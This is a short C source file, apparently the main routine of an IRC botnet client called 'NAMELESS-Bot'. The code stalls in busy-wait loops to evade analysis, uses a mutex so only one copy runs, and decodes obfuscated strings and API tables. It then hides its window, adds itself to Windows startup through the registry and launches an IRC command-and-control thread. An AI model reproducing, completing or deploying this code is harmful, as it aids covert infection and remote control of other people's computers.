/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

          Thanks To; The Rogue & t0nix
*/

#include "global.h"

int main ()
{
    DWORD x = 0, y = 0;
    int z =0;

    for (x; x < 0xFEF39192; x++);  // rnd wait

    CreateMutex(0,0,mutex); //Create Mutex
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        ExitProcess(0); //if were already running - exit
    }
    else //if we arnt running
    {
        wait_();

        decode_things(); // decoding strings

        wait_();

        load_apis(); // api structure decoding

        wait_();

        Thread_Start(&CreateWin, NULL, FALSE); // hide my plz kthnx

        wait_();

        AddStartup(); // Add to Startup via Registry

        for (y; y < 0xFFFFFFFF; y++); // rnd wait

        Thread_Start(Node_Thread, NULL, TRUE); // start main/irc thread
    }
}
